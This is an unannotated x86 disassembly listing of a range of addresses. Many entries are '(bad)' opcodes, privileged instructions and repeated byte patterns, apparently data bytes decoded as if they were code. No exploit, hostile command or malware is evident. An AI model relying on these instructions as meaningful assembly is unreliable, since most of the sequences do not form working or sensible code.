  408bb9:	test   DWORD PTR [eax+eax*1],0x4f7e9
  408bc0:	jmp    0xe94090bc
  408bc5:	test   DWORD PTR [eax+eax*1],0x4f7e9
  408bcc:	jmp    0xe94090c8
  408bd1:	test   DWORD PTR [eax+eax*1],0xff340e66
  408bd8:	pop    esi
  408bd9:	push   cs
  408bda:	xor    al,0xff
  408bdc:	push   esi
  408bdd:	(bad)  
  408bde:	xor    edi,edi
  408be0:	dec    esi
  408be1:	(bad)  
  408be2:	xor    edi,edi
  408be4:	inc    esi
  408be5:	out    dx,al
  408be6:	xor    edi,edi
  408be8:	ds out dx,al
  408bea:	xor    edi,edi
  408bec:	fidiv  WORD PTR ss:[ebx]
  408bef:	jmp    FWORD PTR [esi]
	...
  408c09:	add    dh,bl
  408c0b:	xor    edi,edi
  408c0d:	es into 
  408c0f:	xor    edi,edi
  408c11:	push   ds
  408c12:	into   
  408c13:	xor    edi,edi
  408c15:	push   ss
  408c16:	mov    esi,0xbe0eff33
  408c1b:	xor    edi,edi
  408c1d:	add    BYTE PTR [ebp+0x9],bl
  408c20:	add    al,BYTE PTR [ebx]
  408c22:	push   ecx
  408c23:	add    eax,0x1550706
  408c28:	(bad)  
  408c29:	dec    DWORD PTR [edx-0x12]
  408c2c:	(bad)  
  408c2d:	call   FWORD PTR [edx+0x3]
  408c30:	or     ecx,DWORD PTR [eax+ebx*2]
  408c33:	dec    BYTE PTR [esi]
  408c35:	jmp    FWORD PTR [edx]
  408c37:	out    dx,al
  408c38:	(bad)  
  408c39:	jmp    FWORD PTR [edx]
  408c3b:	out    dx,al
  408c3c:	(bad)  
  408c3d:	(bad)  
  408c3e:	cmp    ch,dh
  408c40:	(bad)  
  408c41:	jmp    FWORD PTR [edx-0x12]
  408c44:	(bad)  
  408c45:	jmp    FWORD PTR [edx-0x12]
  408c48:	(bad)  
  408c49:	dec    DWORD PTR [edx-0x12]
  408c4c:	(bad)  
  408c4d:	call   FWORD PTR [edx+0x3]
  408c50:	or     ecx,DWORD PTR [eax+ebx*1]
  408c53:	dec    BYTE PTR [esi]
  408c55:	jmp    FWORD PTR [edx-0x12]
  408c58:	(bad)  
  408c59:	jmp    FWORD PTR [edx-0x12]
  408c5c:	(bad)  
  408c5d:	(bad)  
  408c5e:	jp     0x408c4d
  408c60:	(bad)  
  408c61:	jmp    FWORD PTR [edx-0x12]
  408c64:	(bad)  
  408c65:	jmp    FWORD PTR [edx-0x12]
  408c68:	(bad)  
  408c69:	dec    DWORD PTR [edx-0x12]
  408c6c:	(bad)  
  408c6d:	inc    DWORD PTR [eax]
	...
  408c87:	fld    QWORD PTR [edi]
  408c89:	add    BYTE PTR [eax],al
  408c8b:	fld    QWORD PTR [edi]
  408c8d:	add    BYTE PTR [eax],al
  408c8f:	int    0x7
  408c91:	add    BYTE PTR [eax],al
  408c93:	int    0x7
  408c95:	add    BYTE PTR [eax],al
  408c97:	popf   
  408c98:	pop    es
  408c99:	add    BYTE PTR [eax],al
  408c9b:	popf   
  408c9c:	pop    es
  408c9d:	add    BYTE PTR [eax],al
  408c9f:	lea    eax,[edi]
  408ca1:	add    BYTE PTR [eax],al
  408ca3:	lea    eax,[edi]
  408ca5:	add    BYTE PTR [eax],al
  408ca7:	popf   
  408ca8:	pop    es
  408ca9:	add    BYTE PTR [eax],al
  408cab:	popf   
  408cac:	pop    es
  408cad:	add    BYTE PTR [eax],al
  408caf:	hlt    
  408cb0:	sbb    eax,0x1df40003
  408cb5:	add    eax,DWORD PTR [eax]
  408cb7:	hlt    
  408cb8:	sbb    eax,0x1df40003
  408cbd:	add    eax,DWORD PTR [eax]
  408cbf:	hlt    
  408cc0:	sbb    eax,0x1df40003
  408cc5:	add    eax,DWORD PTR [eax]
  408cc7:	hlt    
  408cc8:	sbb    eax,0x1df40003
  408ccd:	add    eax,DWORD PTR [eax]
  408ccf:	hlt    
  408cd0:	sbb    eax,0x1df40003
  408cd5:	add    eax,DWORD PTR [eax]
  408cd7:	hlt    
  408cd8:	sbb    eax,0x1df40003
  408cdd:	add    eax,DWORD PTR [eax]
  408cdf:	hlt    
  408ce0:	sbb    eax,0x1df40003
  408ce5:	add    eax,DWORD PTR [eax]
  408ce7:	hlt    
  408ce8:	sbb    eax,0x3
	...
  408d01:	add    BYTE PTR [eax],al
  408d03:	add    ah,dh
  408d05:	sbb    eax,0x1df40003
  408d0a:	add    eax,DWORD PTR [eax]
  408d0c:	hlt    
  408d0d:	sbb    eax,0x1bf40003
  408d12:	add    eax,DWORD PTR [eax]
  408d14:	hlt    
  408d15:	sbb    eax,DWORD PTR [ebx]
  408d17:	add    ah,dh
  408d19:	sbb    eax,DWORD PTR [ebx]
  408d1b:	add    ah,dh
  408d1d:	sbb    eax,DWORD PTR [ebx]
  408d1f:	add    ah,dh
  408d21:	sbb    eax,DWORD PTR [ebx]
  408d23:	add    ah,dh
  408d25:	sbb    eax,DWORD PTR [ebx]
  408d27:	add    ah,dh
  408d29:	sbb    eax,DWORD PTR [ebx]
  408d2b:	add    ah,dh
  408d2d:	sbb    eax,DWORD PTR [ebx]
  408d2f:	add    ah,dh
  408d31:	sbb    eax,DWORD PTR [ebx]
  408d33:	add    ah,dh
  408d35:	sbb    eax,DWORD PTR [ebx]
  408d37:	add    ah,dh
  408d39:	sbb    eax,DWORD PTR [ebx]
  408d3b:	add    ah,dh
  408d3d:	sbb    eax,DWORD PTR [ebx]
  408d3f:	add    ah,dh
  408d41:	add    al,0xe9
  408d43:	add    dh,ch
  408d45:	add    al,0xe8
  408d47:	add    dh,ch
  408d49:	add    ebp,eax
  408d4b:	add    dh,ch
  408d4d:	add    ebp,eax
  408d4f:	add    dh,ch
  408d51:	add    ebp,eax
  408d53:	add    dh,ch
  408d55:	add    ebp,eax
  408d57:	add    dh,ch
  408d59:	add    ebp,eax
  408d5b:	add    dh,ch
  408d5d:	add    ebp,eax
  408d5f:	add    dh,ch
  408d61:	add    al,0xe8
  408d63:	add    al,0xf5
  408d65:	add    ebp,eax
  408d67:	add    al,0x0
	...
  408d81:	cmc    
  408d82:	add    ebp,eax
  408d84:	add    al,0xf5
  408d86:	add    ebp,eax
  408d88:	add    al,0xf5
  408d8a:	add    ebp,eax
  408d8c:	add    al,0xf5
  408d8e:	add    ebp,eax
  408d90:	add    al,0xf5
  408d92:	add    ebp,eax
  408d94:	add    al,0xf5
  408d96:	add    ebp,eax
  408d98:	add    al,0xf5
  408d9a:	add    ebp,eax
  408d9c:	add    al,0xf5
  408d9e:	add    ebp,eax
  408da0:	add    al,0xf5
  408da2:	add    ebp,eax
  408da4:	add    al,0xf5
  408da6:	add    ebp,eax
  408da8:	add    al,0xf5
  408daa:	add    ebp,eax
  408dac:	add    al,0xf5
  408dae:	add    ebp,eax
  408db0:	add    al,0xf5
  408db2:	add    ebp,eax
  408db4:	add    al,0xf5
  408db6:	add    ebp,eax
  408db8:	add    al,0xf5
  408dba:	add    al,0xe9
  408dbc:	add    esi,esp
  408dbe:	add    al,0xe9
  408dc0:	add    esi,esp
  408dc2:	add    al,0xe9
  408dc4:	add    esi,esp
  408dc6:	add    al,0xe9
  408dc8:	add    esi,esp
  408dca:	add    al,0xe9
  408dcc:	add    esi,esp
  408dce:	add    al,0xe9
  408dd0:	add    esi,esp
  408dd2:	add    al,0x0
  408dd4:	jmp    0xe94092d0
  408dd9:	test   DWORD PTR [eax+eax*1],0x4f7e9
  408de0:	jmp    0xe94092dc
	...
  408dfd:	add    bh,dh
  408dff:	add    al,0x0
  408e01:	jmp    0xe94092fd
  408e06:	test   DWORD PTR [eax+eax*1],0x4f7e9
  408e0d:	jmp    0xe9409309
  408e12:	test   DWORD PTR [eax+eax*1],0x4f7e9
  408e19:	jmp    0xe9409315
  408e1e:	test   DWORD PTR [eax+eax*1],0x4f7e9
  408e25:	jmp    0xe9409321
  408e2a:	test   DWORD PTR [eax+eax*1],0x4f7e9
  408e31:	jmp    0xe940932d
  408e36:	test   DWORD PTR [eax+eax*1],0x4f7e9
  408e3d:	jmp    0xe9409339
  408e42:	test   DWORD PTR [eax+eax*1],0x4f7e9
  408e49:	jmp    0xe9409345
  408e4e:	test   DWORD PTR [eax+eax*1],0x4f7e9
  408e55:	jmp    0xe543914a
  408e5a:	hlt    
  408e5b:	push   es
  408e5c:	pop    es
  408e5d:	loope  0x408e47
  408e5f:	cli    
  408e60:	or     bl,ch
	...
  408e7a:	add    ah,bh
  408e7c:	dec    BYTE PTR [esi]
  408e7e:	add    ch,cl
  408e80:	sbb    DWORD PTR [edx],edx
  408e82:	adc    ecx,ecx
  408e84:	adc    eax,0x11c51716
  408e89:	sbb    bl,BYTE PTR [ebx]
  408e8b:	ror    DWORD PTR ds:0x29bd1f1e,0x21
  408e92:	and    edi,DWORD PTR [ecx-0x4ad8dadb]
  408e98:	and    DWORD PTR [ecx],ebp
  408e9a:	sub    esi,DWORD PTR [ecx-0x52d0d2e3]
  408ea0:	cmp    DWORD PTR [ecx],esi
  408ea2:	xor    ebp,DWORD PTR [ecx-0x5ac8cacb]
  408ea8:	xor    DWORD PTR [ecx],edi
  408eaa:	cmp    esp,DWORD PTR [ecx+0x1d3f3d2d]
  408eb0:	fs popa 
  408eb2:	arpl   WORD PTR [ecx-0x4a989a71],di
  408eb8:	pop    ebx
  408eb9:	imul   ebp,DWORD PTR [ebx-0xf],0xed6f6d67
  408ec0:	jae    0x408f33
  408ec2:	jae    0x408ead
  408ec4:	pop    edi
  408ec5:	jne    0x408f3e
  408ec7:	in     eax,0x6b
  408ec9:	jns    0x408f26
  408ecb:	add    DWORD PTR [eax+0x5d],ebx
  408ece:	pop    edi
  408ecf:	std    
  408ed0:	arpl   WORD PTR [ecx+0x63],sp
  408ed3:	stc    
  408ed4:	(bad)  
  408ed5:	gs addr16 cmc 
  408ed8:	pop    ebx
  408ed9:	imul   ebp,DWORD PTR [ebx-0xf],0x6f6d66
	...
  408ef8:	in     eax,dx
  408ef9:	jb     0x408f6c
  408efb:	jae    0x408ee6
  408efd:	pop    esi
  408efe:	jne    0x408f77
  408f00:	in     eax,0x6a
  408f02:	jns    0x408f7f
  408f04:	loope  0x408f7c
  408f06:	jge    0x408f87
  408f08:	pop    ebp
  408f09:	test   BYTE PTR [edx-0x7a4fa67d],al
  408f0f:	xchg   esp,esi
  408f11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f12:	mov    cl,BYTE PTR [edx-0x71792e81]
  408f18:	jnp    0x408ee7
  408f1a:	xchg   edx,eax
  408f1b:	xchg   edx,eax
  408f1c:	xchg   ecx,ebx
  408f1e:	mov    ss,WORD PTR [esi-0x65652a7d]
  408f24:	outs   dx,DWORD PTR ds:[esi]
  408f25:	rcl    DWORD PTR [esi+0x62bd6b9e],0xa2
  408f2c:	push   edi
  408f2d:	leave  
  408f2e:	pop    esi
  408f2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f30:	push   ebx
  408f31:	lds    ebp,FWORD PTR [edx-0x56]
  408f34:	lahf   
  408f35:	icebp  
  408f36:	data16 scas al,BYTE PTR es:[edi]
  408f38:	fwait
  408f39:	in     eax,dx
  408f3a:	jb     0x408eee
  408f3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f3d:	stc    
  408f3e:	outs   dx,BYTE PTR ds:[esi]
  408f3f:	mov    dh,0xa3
  408f41:	cmc    
  408f42:	jp     0x408efe
  408f44:	(bad)  
  408f45:	loope  0x408fbd
  408f47:	mov    esi,0xc2425d8b
  408f4c:	aaa    
  408f4d:	imul   edi,DWORD PTR [esi],0x4a6533c6
  408f53:	retf   0x913f
  408f56:	inc    esi
  408f57:	into   
  408f58:	cmp    ecx,DWORD PTR [ebp+0xd252]
	...
  408f72:	add    BYTE PTR [eax],al
  408f74:	add    BYTE PTR [edi-0x67],al
  408f77:	dec    esi
  408f78:	(bad)  
  408f79:	inc    ebx
  408f7a:	xchg   ebp,eax
  408f7b:	pop    edx
  408f7c:	fisubr DWORD PTR [edi]
  408f7e:	adc    DWORD PTR [esi-0x22],0xe2227d2b
  408f85:	pop    ss
  408f86:	mov    DWORD PTR [esi],ebx
  408f88:	out    0x13,al
  408f8a:	test   DWORD PTR [edx],ebp
  408f8c:	jmp    0xacdb:0xee25b0df
  408f93:	xor    edx,esi
  408f95:	out    0xb8,eax
  408f97:	sub    eax,0x39b4e3f6
  408f9c:	cli    
  408f9d:	iret   
  408f9e:	mov    al,ds:0x5cbfe35
  408fa3:	jmp    0xe54285aa
  408fa8:	(bad)  
  408fa9:	icebp  
  408faa:	add    eax,0xf9fe0ae1
  408faf:	fadd   QWORD PTR [esi]
  408fb1:	cli    
  408fb2:	std    
  408fb3:	fcom   DWORD PTR [edx]
  408fb5:	push   es
  408fb6:	adc    dl,ch
  408fb8:	push   cs
  408fb9:	add    dl,BYTE PTR [esi]
  408fbb:	rcr    DWORD PTR [edx],1
  408fbd:	out    dx,al
  408fbe:	or     ebp,ecx
  408fc0:	push   ss
  408fc1:	jmp    0xc4e1:0xd5e2c90d
  408fc8:	(bad)  
  408fca:	in     eax,0xc0
  408fcc:	jmp    0xde19:0xe6bcda1d
  408fd3:	mov    eax,0xb4f225f2
  408fd8:	out    dx,al
	...
  408ff1:	add    BYTE PTR [ecx],ah
  408ff3:	div    BYTE PTR [eax-0x5315f206]
  408ff9:	test   BYTE PTR [ecx],0xee
  408ffc:	sub    BYTE PTR [ebp-0x56bb5e2b],ah
  409002:	shl    DWORD PTR [ebp-0x666262c0],1
  409008:	cmp    al,0xa1
  40900a:	cdq    
  40900b:	popf   
  40900c:	cmp    BYTE PTR [ebp-0x46cb4e5b],dh
  409012:	mov    eax,ds:0x8dad30b5
  409017:	leave  
  409018:	or     al,0xd1
  40901a:	test   eax,0xb5c508cd
  40901f:	shl    DWORD PTR [ecx+ecx*8],0xb1
  409023:	lds    esp,FWORD PTR [eax]
  409025:	mov    ebp,0xc11cba3d
  40902a:	cmp    DWORD PTR [esi-0x2dba2ae8],edi
  409030:	adc    al,0xd9
  409032:	inc    ecx
  409033:	(bad)  
  409034:	call   DWORD PTR [eax]
  409036:	ror    ebx,0x7a
  409039:	in     eax,dx
  40903a:	test   BYTE PTR [edi-0x7d869682],ch
  409040:	and    DWORD PTR [ebp+0x6d],0xffffff86
  409044:	xchg   DWORD PTR [ecx+0x31],esp
  409047:	jnp    0x408fd4
  409049:	pop    ebp
  40904a:	jne    0x4090ca
  40904c:	(bad)  
  40904d:	pop    ecx
  40904e:	mov    DWORD PTR [edx-0x6982aa6d],edx
  409054:	xchg   edi,eax
  409055:	push   ecx
	...
  40906e:	add    BYTE PTR [ecx+0x654d9b8a],al
  409074:	mov    ds,WORD PTR [edi-0x5c9ce6b7]
  40907a:	inc    ebp
  40907b:	or     eax,0xd141a767
  409080:	pop    edx
  409081:	stos   DWORD PTR es:[edi],eax
  409082:	cmp    eax,0x39af5ed5
  409087:	jmp    0xdd7643fe
  40908c:	jbe    0x409045
  40908e:	xor    ecx,esp
  409090:	push   0xffffffbb
  409092:	sub    eax,0xa9bf6ec5
  409097:	mov    eax,0xaca5c342
  40909c:	inc    esi
  40909d:	(bad)  
  40909e:	mov    eax,ds:0x9dcb3af0
  4090a3:	mov    ah,0x3e
  4090a5:	iret   
  4090a6:	cdq    
  4090a7:	enter  0xd352,0x95
  4090ab:	mov    esp,0xc091d756
  4090b0:	dec    edx
  4090b1:	fisttp DWORD PTR [ebp-0x7620b15c]
  4090b7:	fsub   DWORD PTR [edx]
  4090b9:	jecxz  0x409040
  4090bb:	int3   
  4090bc:	es out 0x81,eax
  4090bf:	adc    BYTE PTR [edi],bl
  4090c1:	jmp    0x409140
  4090c3:	adc    al,0x1b
  4090c5:	out    dx,eax
  4090c6:	add    BYTE PTR [ebp-0xf],bl
  4090c9:	icebp  
  4090ca:	repz popa 
  4090cc:	in     eax,dx
  4090cd:	cmc    
  4090ce:	test   DWORD PTR [ebp-0x27],0xfbf9
	...
  4090e9:	add    BYTE PTR [eax],al
  4090eb:	add    BYTE PTR [ecx-0xb],bl
  4090ee:	std    
  4090ef:	dec    ebp
  4090f1:	ss (bad) 
  4090f3:	dec    esp
  4090f5:	or     BYTE PTR [eax],al
  4090f7:	add    BYTE PTR [ebp-0x62fffff8],bl
  4090fd:	or     BYTE PTR [eax],al
  4090ff:	add    BYTE PTR [ebp-0x72fffff8],cl
  409105:	or     BYTE PTR [eax],al
  409107:	add    BYTE PTR [ebp-0x62fffff8],bl
  40910d:	or     BYTE PTR [eax],al
  40910f:	add    BYTE PTR [ebp-0x72fffff8],cl
  409115:	or     bh,bh
  409117:	add    ecx,DWORD PTR [ebx+0x7b000008]
  40911d:	or     BYTE PTR [eax],al
  40911f:	add    BYTE PTR [ebp+0x8],cl
  409122:	add    BYTE PTR [eax],al
  409124:	dec    ebp
  409125:	or     BYTE PTR [eax],al
  409127:	add    BYTE PTR [ebp+0x8],bl
  40912a:	add    BYTE PTR [eax],al
  40912c:	pop    ebp
  40912d:	or     BYTE PTR [eax],al
  40912f:	add    BYTE PTR [ebp+0x8],cl
  409132:	add    BYTE PTR [eax],al
  409134:	dec    ebp
  409135:	or     bh,bh
  409137:	add    ebx,DWORD PTR ds:0x1d000008
  40913d:	or     BYTE PTR [eax],al
  40913f:	add    BYTE PTR ds:0xd000008,cl
  409145:	or     BYTE PTR [eax],al
  409147:	add    BYTE PTR ds:0x1d000008,bl
  40914d:	or     BYTE PTR [eax],al
	...
  409167:	add    BYTE PTR [eax],al
  409169:	or     eax,0xd000008
  40916e:	or     BYTE PTR [eax],al
  409170:	add    ah,dh
  409172:	xchg   ebx,eax
  409173:	xor    edi,edi
  409175:	repz sbb eax,0x1df40003
  40917b:	add    eax,DWORD PTR [eax]
  40917d:	hlt    
  40917e:	sbb    eax,0x1df40003
  409183:	add    eax,DWORD PTR [eax]
  409185:	hlt    
  409186:	sbb    eax,0x1df40003
  40918b:	add    eax,DWORD PTR [eax]
  40918d:	hlt    
  40918e:	sbb    eax,0x1df40003
  409193:	add    eax,DWORD PTR [eax]
  409195:	hlt    
  409196:	mov    ebx,0x1dfbff30
  40919b:	add    eax,DWORD PTR [eax]
  40919d:	hlt    
  40919e:	sbb    eax,0x1df40003
  4091a3:	add    eax,DWORD PTR [eax]
  4091a5:	hlt    
  4091a6:	sbb    eax,0x1df40003
  4091ab:	add    eax,DWORD PTR [eax]
  4091ad:	hlt    
  4091ae:	sbb    eax,0x13f7ff03
  4091b3:	xor    edi,edi
  4091b5:	jae    0x4091b2
  4091b7:	xor    bh,bh
  4091b9:	sti    
  4091ba:	sbb    eax,0x1df40003
  4091bf:	add    eax,DWORD PTR [eax]
  4091c1:	hlt    
  4091c2:	sbb    eax,0x1df40003
  4091c7:	add    eax,DWORD PTR [eax]
  4091c9:	hlt    
  4091ca:	sbb    eax,0x3
	...
  4091e3:	add    BYTE PTR [eax],al
  4091e5:	add    ah,dh
  4091e7:	dec    ebx
  4091e8:	xor    bh,bh
  4091ea:	xor    edx,DWORD PTR [edx+0x30]
  4091ed:	jmp    FWORD PTR [ebx]
  4091ef:	cmp    dh,BYTE PTR [eax]
  4091f1:	jmp    DWORD PTR [ebx-0xbfffce3]
  4091f7:	sbb    eax,0x1df40003
  4091fc:	add    eax,DWORD PTR [eax]
  4091fe:	hlt    
  4091ff:	sbb    eax,0x4f40003
  409204:	jmp    0x9e45860c
  409209:	xor    bl,dh
  40920b:	sub    dl,BYTE PTR [esi-0x71d514d0]
  409211:	xor    bl,ah
  409213:	stos   BYTE PTR es:[edi],al
  409214:	call   0xe945861c
  409219:	add    esi,esp
  40921b:	add    al,0xe9
  40921d:	add    esi,esp
  40921f:	add    al,0xe9
  409221:	add    esi,esp
  409223:	add    al,0xe9
  409225:	add    esi,esp
  409227:	add    al,0x5f
  409229:	xor    ah,dh
  40922b:	sub    al,ch
  40922d:	add    esi,esp
  40922f:	sub    al,0xe8
  409231:	add    esi,esp
  409233:	lods   al,BYTE PTR ds:[esi]
  409234:	call   0xe945863c
  409239:	add    esi,esp
  40923b:	add    al,0xe9
  40923d:	add    esi,esp
  40923f:	add    al,0xe9
  409241:	add    esi,esp
  409243:	add    al,0x26
  409245:	xor    BYTE PTR [ebx+0x2a],bh
  409248:	jmp    0x409250
	...
  409261:	add    BYTE PTR [eax],al
  409263:	hlt    
  409264:	add    al,0xe9
  409266:	add    esi,esp
  409268:	add    al,0xe9
  40926a:	add    esi,esp
  40926c:	test   cl,ch
  40926e:	add    esi,esp
  409270:	add    al,0xe9
  409272:	add    esi,esp
  409274:	add    al,0xe9
  409276:	add    esi,esp
  409278:	add    al,0xe9
  40927a:	add    esi,esp
  40927c:	add    al,0x69
  40927e:	add    al,0xf4
  409280:	add    al,0xe9
  409282:	add    esi,esp
  409284:	add    al,0xe9
  409286:	add    al,0xf5
  409288:	add    al,0xe8
  40928a:	add    al,0xf4
  40928c:	add    al,0xe9
  40928e:	add    esi,esp
  409290:	add    al,0xe9
  409292:	add    esi,esp
  409294:	add    al,0x0
  409296:	jmp    0xe9409792
  40929b:	test   DWORD PTR [eax+eax*1],0x4f7e8
  4092a2:	imul   edi,eax,0x70690004
  4092a8:	test   BYTE PTR [eax+0x84f7e9],al
  4092ae:	in     eax,0xeb
  4092b0:	or     BYTE PTR [ebx*8-0x2ae3f6fd],bl
  4092b7:	sti    
  4092b8:	add    al,0x0
  4092ba:	jmp    0xe9c097b6
  4092bf:	in     eax,dx
  4092c0:	push   cs
  4092c1:	sbb    al,BYTE PTR [ebx]
  4092c3:	dec    BYTE PTR [esi]
  4092c5:	adc    bh,bl
	...
  4092df:	add    BYTE PTR ds:0x5fb1217,al
  4092e5:	pop    ss
  4092e6:	adc    bl,bl
  4092e8:	add    eax,0xe5db1217
  4092ed:	push   ss
  4092ee:	adc    bl,bl
  4092f0:	in     eax,0x16
  4092f2:	sub    BYTE PTR [ecx-0x8],0x84
  4092f6:	adc    cl,ch
  4092f8:	in     eax,dx
  4092f9:	push   cs
  4092fa:	sbb    al,BYTE PTR [ebx]
  4092fc:	dec    BYTE PTR [esi]
  4092fe:	adc    bh,bl
  409300:	add    eax,0x5fb1217
  409305:	pop    ss
  409306:	adc    bl,bl
  409308:	add    eax,0xe5db1217
  40930d:	push   ss
  40930e:	adc    bl,bl
  409310:	in     eax,0x16
  409312:	sub    BYTE PTR [ecx-0x8],0x4
  409316:	add    cl,ch
  409318:	test   DWORD PTR [eax+eax*1],0x4f7e9
  40931f:	jmp    0xe940981b
  409324:	test   DWORD PTR [eax+eax*1],0x50d00
  40932b:	add    BYTE PTR ds:0x1d000005,bl
  409331:	add    eax,0x50d0000
  409336:	add    BYTE PTR [eax],al
  409338:	or     eax,0xdd000005
  40933d:	add    al,0x0
  40933f:	add    ch,bl
  409341:	add    al,0x0
	...
  40935b:	add    BYTE PTR [eax],al
  40935d:	int    0x4
  40935f:	add    BYTE PTR [eax],al
  409361:	int    0x4
  409363:	add    BYTE PTR [eax],al
  409365:	fld    QWORD PTR [eax+eax*1]
  409368:	add    ch,bl
  40936a:	add    al,0x0
  40936c:	add    ch,cl
  40936e:	add    al,0x0
  409370:	add    ch,cl
  409372:	add    al,0x0
  409374:	add    BYTE PTR [ebp-0x62fffffc],bl
  40937a:	add    al,0x0
  40937c:	add    BYTE PTR [ebp-0x72fffffc],cl
  409382:	add    al,0x0
  409384:	add    BYTE PTR [ebp-0x62fffffc],bl
  40938a:	add    al,0x0
  40938c:	add    BYTE PTR [ebp-0x72fffffc],cl
  409392:	add    al,0x0
  409394:	add    BYTE PTR [ebp+0x4],bl
  409397:	add    BYTE PTR [eax],al
  409399:	pop    ebp
  40939a:	add    al,0x0
  40939c:	add    BYTE PTR [ebp+0x4],cl
  40939f:	add    BYTE PTR [eax],al
  4093a1:	dec    ebp
  4093a2:	add    al,0x0
  4093a4:	add    BYTE PTR [ebp+0x4],bl
  4093a7:	add    BYTE PTR [eax],al
  4093a9:	pop    ebp
  4093aa:	add    al,0x0
  4093ac:	add    BYTE PTR [ebp+0x4],cl
  4093af:	add    BYTE PTR [eax],al
  4093b1:	dec    ebp
  4093b2:	add    al,0x1
  4093b4:	add    DWORD PTR ds:0xf4000004,ebx
  4093ba:	sbb    eax,0x1cf40003
  4093bf:	add    al,BYTE PTR [eax]
	...
  4093d9:	add    ah,dh
  4093db:	sbb    al,0x2
  4093dd:	add    ebp,esi
  4093df:	sbb    al,0x2
  4093e1:	add    ebp,esi
  4093e3:	sbb    al,0x2
  4093e5:	add    ebp,esi
  4093e7:	sbb    al,0x2
  4093e9:	add    edi,esi
  4093eb:	sbb    al,BYTE PTR [edx]
  4093ed:	add    ebp,esi
  4093ef:	sbb    al,0x2
  4093f1:	add    ebp,esi
  4093f3:	sbb    al,0x1
  4093f5:	add    ebp,esi
  4093f7:	sbb    eax,DWORD PTR [ecx]
  4093f9:	add    dh,dh
  4093fb:	sbb    eax,DWORD PTR [ecx]
  4093fd:	add    dh,dh
  4093ff:	sbb    eax,DWORD PTR [edi]
  409401:	add    al,0xf0
  409403:	sbb    eax,DWORD PTR [ecx]
  409405:	add    bh,al
  409407:	sbb    eax,DWORD PTR [ecx]
  409409:	add    dh,dh
  40940b:	sbb    eax,DWORD PTR [ecx]
  40940d:	add    al,0xf8
  40940f:	and    DWORD PTR [ecx],eax
  409411:	add    dh,dh
  409413:	sbb    DWORD PTR [ecx],eax
  409415:	add    dh,dh
  409417:	sbb    eax,DWORD PTR [ecx]
  409419:	add    dh,al
  40941b:	sbb    DWORD PTR [edi],eax
  40941d:	add    dh,dh
  40941f:	sbb    eax,DWORD PTR [edi]
  409421:	add    ebp,esi
  409423:	sbb    al,0x2
  409425:	add    ebp,esi
  409427:	and    BYTE PTR [esi],al
  409429:	and    ebp,edx
  40942b:	sbb    eax,0x1afa0300
  409430:	add    BYTE PTR [ebx],al
  409432:	neg    DWORD PTR [edx]
  409434:	add    BYTE PTR [ebx],al
  409436:	neg    DWORD PTR [edx]
  409438:	add    BYTE PTR [ebx],al
  40943a:	icebp  
  40943b:	sbb    al,BYTE PTR [eax]
  40943d:	add    eax,0x0
	...
  409456:	add    bh,dh
  409458:	sbb    al,BYTE PTR [eax]
  40945a:	add    esi,edi
  40945c:	sbb    al,0x2
  40945e:	add    edi,esi
  409460:	sbb    al,0x0
  409462:	add    edi,esi
  409464:	add    al,0xe8
  409466:	add    ch,dh
  409468:	add    eax,0x4f500e8
  40946d:	or     bh,BYTE PTR [ecx]
  40946f:	mov    ah,0x4
  409471:	mov    ?,WORD PTR cs:[esp+eax*1+0x4b48e43]
  409479:	xor    DWORD PTR [edx-0x4a],0xb69cb104
  409480:	add    al,0x3d
  409482:	(bad)  
  409483:	mov    ah,0x4
  409485:	cmp    BYTE PTR [esp+esi*1+0x5],ah
  409489:	sbb    BYTE PTR [edi-0x71b8facc],cl
  40948f:	xor    al,0x5
  409491:	push   ecx
  409492:	jb     0x4094ca
  409494:	add    eax,0x5348db9
  409499:	sbb    BYTE PTR [esi+0x3b30534],cl
  40949f:	and    BYTE PTR ds:0x4f403e9,al
  4094a5:	mov    BYTE PTR [ebx],al
  4094a7:	push   esi
  4094a8:	add    eax,0x4f4038a
  4094ad:	int    0x3
  4094af:	or     eax,0x2403da05
  4094b4:	add    eax,0x51503d5
  4094b9:	rol    BYTE PTR [ebx],0x0
	...
  4094d4:	cmp    al,BYTE PTR ds:0x51103c8
  4094da:	les    eax,FWORD PTR [ebx]
  4094dc:	hlt    
  4094dd:	add    al,0xe8
  4094df:	add    al,bh
  4094e1:	add    al,0xac
  4094e3:	add    ecx,ebp
  4094e5:	add    al,0xe9
  4094e7:	add    esi,esp
  4094e9:	add    al,0xbf
  4094eb:	add    esp,eax
  4094ed:	add    al,0x81
  4094ef:	add    ecx,eax
  4094f1:	add    al,0xe9
  4094f3:	add    esi,esp
  4094f5:	add    al,0x0
  4094f7:	call   0xa1f7:0x94ff9ff7
  4094fe:	dec    DWORD PTR [edx-0x8]
  409501:	aam    0xff
  409503:	pop    edx
  409504:	lock fwait
  409506:	call   FWORD PTR [esi-0x8]
  409509:	fwait
  40950a:	(bad)  
  40950b:	cmp    al,0xf0
  40950d:	lahf   
  40950e:	dec    DWORD PTR [ebp-0x8]
  409511:	lahf   
  409512:	(bad)  
  409513:	call   0x7409a0f
  409518:	clc    
  409519:	lahf   
  40951a:	push   DWORD PTR [eax]
  40951c:	lock lahf 
  40951e:	(bad)  
  40951f:	call   0xca409a1b
  409524:	sub    al,ch
  409526:	call   DWORD PTR [eax-0x6f003d81]
  40952c:	jg     0x4094f0
  40952e:	call   ebx
  409530:	not    DWORD PTR [edi+0x4f7e8ff]
  409536:	add    cl,cl
	...
  409550:	add    bh,dh
  409552:	xlat   BYTE PTR ds:[ebx]
  409553:	inc    DWORD PTR [esi]
  409555:	lock add al,0x0
  409558:	jmp    0xc409a54
  40955d:	lock xchg edi,eax
  40955f:	dec    DWORD PTR [ebx]
  409561:	clc    
  409562:	mov    ah,0xff
  409564:	add    esi,eax
  409566:	mov    cl,0xff
  409568:	call   0xb5409a64
  40956d:	not    DWORD PTR [edi+0x4f7b8ff]
  409573:	add    dh,al
  409575:	pop    ebx
  409576:	pushf  
  409577:	outs   dx,DWORD PTR ds:[esi]
  409578:	xchg   ebp,eax
  409579:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40957a:	mov    dl,0x2d
  40957c:	test   DWORD PTR [ebx-0x7c520067],eax
  409582:	pushf  
  409583:	outs   dx,DWORD PTR ds:[esi]
  409584:	jge    0x40952a
  409586:	mov    dl,0x52
  409588:	add    cl,dl
  40958a:	pusha  
  40958b:	jno    0x409601
  40958d:	shl    BYTE PTR [ecx-0x1],0xff
  409591:	xchg   edx,eax
